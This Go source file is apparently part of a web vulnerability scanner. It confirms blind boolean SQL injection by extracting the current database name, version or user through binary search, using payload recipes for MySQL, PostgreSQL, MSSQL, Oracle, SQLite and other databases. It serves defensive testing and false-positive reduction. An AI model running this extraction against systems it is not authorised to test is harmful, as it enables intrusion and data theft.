package scanner

import (
	"context"
	"fmt"
	"strings"
)

// ─────────────────────────────────────────────────────────────────────────────
// Blind boolean SQLi → PROOF BY EXTRACTION.
//
// A length/content/arithmetic differential shows only that "the parameter changes
// the page". That is necessary but NOT sufficient for SQLi: a CDN edge, a video
// manifest keyed by id, an A/B bucket, or any id→object endpoint changes the page
// too, and those are the dominant blind-boolean false positives (the aparat.com
// "content differential — equal size, different object" report is exactly this).
//
// The decisive difference is that a REAL boolean SQLi lets you EXECUTE arbitrary
// boolean SQL and therefore EXFILTRATE data, while a coincidental differential
// yields nothing to an extractor. So we turn the detected TRUE/FALSE oracle into a
// data channel and read the CURRENT DATABASE NAME one character at a time. If the
// name comes out — and re-verifies with an equality check — the injection is
// proven and the name goes into the finding's evidence. If extraction fails, the
// differential was noise and NO finding is emitted. This is the FP killer the
// operator asked for: "get a database name for the evidence, or it's garbage."
//
// Everything here is reflection-proof: conditions are pure SQL and we never look
// for reflected text — only the oracle's TRUE/FALSE behaviour — and it is not
// time-based.
// ─────────────────────────────────────────────────────────────────────────────

// dbNameExpr is a per-DBMS recipe for reading the current database name through a
// boolean oracle: `name` yields the DB name, `length` its length, `nth` the ASCII
// code of its n-th character. Only widely-portable primitives are used; recipes
// are tried in order and the first whose oracle calibrates and extracts wins.
type dbNameExpr struct {
	dbms   string // optional "/current-user" suffix identifies fallback proof
	name   string // expression that yields the current database name
	length string // Sprintf(length, name) → its character length
	nth    string // Sprintf(nth, name, pos) → ASCII/UNICODE code of the pos-th char
}

var dbNameExprs = []dbNameExpr{
	{dbms: "mysql", name: "database()",
		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
	{dbms: "postgresql", name: "current_database()",
		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s) FROM %d FOR 1))"},
	{dbms: "mssql", name: "DB_NAME()",
		length: "LEN(%s)", nth: "UNICODE(SUBSTRING((%s),%d,1))"},
	{dbms: "oracle", name: "SYS_CONTEXT('USERENV','DB_NAME')",
		length: "LENGTH(%s)", nth: "ASCII(SUBSTR((%s),%d,1))"},
	// SQLite has no per-file current_database() primitive. Its runtime version is
	// still database-computed, stable, extractable proof that arbitrary SQLite
	// expressions execute through the oracle.
	{dbms: "sqlite", name: "sqlite_version()",
		length: "LENGTH(%s)", nth: "UNICODE(SUBSTR((%s),%d,1))"},
	{dbms: "db2", name: "CURRENT SERVER",
		length: "LENGTH(%s)", nth: "ASCII(SUBSTR((%s),%d,1))"},
	{dbms: "h2", name: "DATABASE()",
		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
	{dbms: "hsqldb", name: "DATABASE()",
		length: "CHAR_LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
	{dbms: "sap-hana", name: "CURRENT_SCHEMA",
		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
	// If schema/database name access is restricted or empty, a current-user value
	// is an equally DB-computed, report-safe proof. It demonstrates arbitrary SQL
	// expression evaluation without dumping application data.
	{dbms: "mysql/current-user", name: "CURRENT_USER()",
		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
	{dbms: "postgresql/current-user", name: "CURRENT_USER",
		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s) FROM %d FOR 1))"},
	{dbms: "mssql/current-user", name: "SUSER_SNAME()",
		length: "LEN(%s)", nth: "UNICODE(SUBSTRING((%s),%d,1))"},
	{dbms: "oracle/current-user", name: "SYS_CONTEXT('USERENV','CURRENT_USER')",
		length: "LENGTH(%s)", nth: "ASCII(SUBSTR((%s),%d,1))"},
	{dbms: "db2/current-user", name: "CURRENT USER",
		length: "LENGTH(%s)", nth: "ASCII(SUBSTR((%s),%d,1))"},
	{dbms: "h2/current-user", name: "USER()",
		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
	{dbms: "hsqldb/current-user", name: "CURRENT_USER",
		length: "CHAR_LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
	{dbms: "sap-hana/current-user", name: "CURRENT_USER",
		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
}

const (
	dbNameMaxLen  = 96 // PostgreSQL identifiers reach 63; user@host can be longer
	dbNameMinCode = 32
	dbNameMaxCode = 126
)

// blindExtractDBName drives the proven boolean oracle to read the current database
// name. condFmt wraps a boolean SQL condition in the injection syntax that was
// proven (exactly one %s), and isTrueLike classifies a response as "condition TRUE"
// using the SAME differential the detector used (length-to-baseline or
// object-identity). Returns (name, dbms, ok); ok=false means the oracle could not
// stably extract — the caller must then NOT report a finding.
func (s *SQLiScanner) blindExtractDBName(
	ctx context.Context, ip insertionPoint, auth map[string]string,
	condFmt string, isTrueLike func([]byte) bool,
) (string, string, bool) {
	return s.blindExtractDBNameResponse(ctx, ip, auth, condFmt, func(r injectedResponse) bool {
		return isTrueLike([]byte(r.Body))
	})
}

// blindExtractDBNameResponse is the status-aware extraction core. Some SQL
// oracles express FALSE as 404/403/500 while rendering an equal-length body;
// preserving the HTTP status prevents those real blind injections from being
// discarded. The compatibility wrapper above retains body-only callers/tests.
func (s *SQLiScanner) blindExtractDBNameResponse(
	ctx context.Context, ip insertionPoint, auth map[string]string,
	condFmt string, isTrueLike func(injectedResponse) bool,
) (string, string, bool) {

	// ask evaluates ONE boolean SQL condition: it sends the condition AND its
	// negation and requires them to read oppositely (reproduced once). Two-sided +
	// reproduced is what makes a noisy/So-not-SQLi endpoint fail fast (ok=false)
	// instead of yielding a garbage character.
	ask := func(cond string) (val bool, ok bool) {
		if ctx.Err() != nil {
			return false, false
		}
		pos := fmt.Sprintf(condFmt, cond)
		neg := fmt.Sprintf(condFmt, "NOT ("+cond+")")
		p1 := sendInjectedResponse(ctx, sqliHTTPClient, ip, pos, auth)
		n1 := sendInjectedResponse(ctx, sqliHTTPClient, ip, neg, auth)
		if p1.Status == 0 || n1.Status == 0 {
			return false, false
		}
		tp, tn := isTrueLike(p1), isTrueLike(n1)
		if tp == tn {
			return false, false // oracle didn't separate the two sides → unusable
		}
		// reproduce the POSITIVE side once to reject a page that just wobbles.
		p2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, pos, auth)
		if p2.Status == 0 || isTrueLike(p2) != tp {
			return false, false
		}
		return tp, true
	}

	// bsearch finds the value v in [lo,hi] such that ask("<expr> >= v") is the
	// highest true — i.e. expr == v — using the oracle. ok=false on any oracle
	// failure so a bad recipe/endpoint aborts immediately.
	bsearch := func(expr string, lo, hi int) (int, bool) {
		for lo < hi {
			mid := (lo + hi + 1) / 2
			v, ok := ask(fmt.Sprintf("%s >= %d", expr, mid))
			if !ok {
				return 0, false
			}
			if v {
				lo = mid
			} else {
				hi = mid - 1
			}
		}
		return lo, true
	}

	// Calibrate the oracle on tautology/contradiction BEFORE trusting it: a real
	// oracle answers 1=1 TRUE and 1=2 FALSE. This rejects a differential that isn't
	// actually evaluating SQL.
	if v, ok := ask("1=1"); !ok || !v {
		return "", "", false
	}
	if v, ok := ask("1=2"); !ok || v {
		return "", "", false
	}

	for _, rec := range dbNameExprs {
		if ctx.Err() != nil {
			return "", "", false
		}
		lenExpr := fmt.Sprintf(rec.length, rec.name)

		// The DB name must be non-empty and within the cap for THIS recipe; a wrong
		// dialect function makes these read inconsistently → ok=false → next recipe.
		if v, ok := ask(fmt.Sprintf("%s >= 1", lenExpr)); !ok || !v {
			continue
		}
		if v, ok := ask(fmt.Sprintf("%s <= %d", lenExpr, dbNameMaxLen)); !ok || !v {
			continue
		}
		L, ok := bsearch(lenExpr, 1, dbNameMaxLen)
		if !ok {
			continue
		}
		// Confirm the exact length with an equality both ways.
		if v, ok := ask(fmt.Sprintf("%s = %d", lenExpr, L)); !ok || !v {
			continue
		}

		var sb strings.Builder
		good := true
		for i := 1; i <= L; i++ {
			nth := fmt.Sprintf(rec.nth, rec.name, i)
			code, ok := bsearch(nth, dbNameMinCode, dbNameMaxCode)
			if !ok || code < dbNameMinCode || code > dbNameMaxCode {
				good = false
				break
			}
			sb.WriteByte(byte(code))
		}
		if !good {
			continue
		}
		name := sb.String()
		if !plausibleDBName(name) {
			continue
		}

		// FINAL independent proof: the reconstructed name must equal the DB name
		// (TRUE) while an altered name must not (FALSE). This makes a lucky
		// binary-search walk essentially impossible to pass by chance.
		esc := strings.ReplaceAll(name, "'", "''")
		if v, ok := ask(fmt.Sprintf("%s = '%s'", rec.name, esc)); !ok || !v {
			continue
		}
		if v, ok := ask(fmt.Sprintf("%s = '%s_'", rec.name, esc)); !ok || v {
			continue
		}
		return name, rec.dbms, true
	}
	return "", "", false
}

// plausibleDBName rejects obviously-garbage extractions (all punctuation, etc.):
// a real identifier has at least one alphanumeric character.
func plausibleDBName(s string) bool {
	if s == "" || len(s) > dbNameMaxLen {
		return false
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') {
			return true
		}
	}
	return false
}

func blindSQLProofDescription(value, dbms string) string {
	if strings.HasSuffix(dbms, "/current-user") {
		return fmt.Sprintf("current database user = %q (%s)", value, strings.TrimSuffix(dbms, "/current-user"))
	}
	if dbms == "sqlite" {
		return fmt.Sprintf("SQLite runtime version = %q", value)
	}
	return fmt.Sprintf("current database/schema = %q (%s)", value, dbms)
}
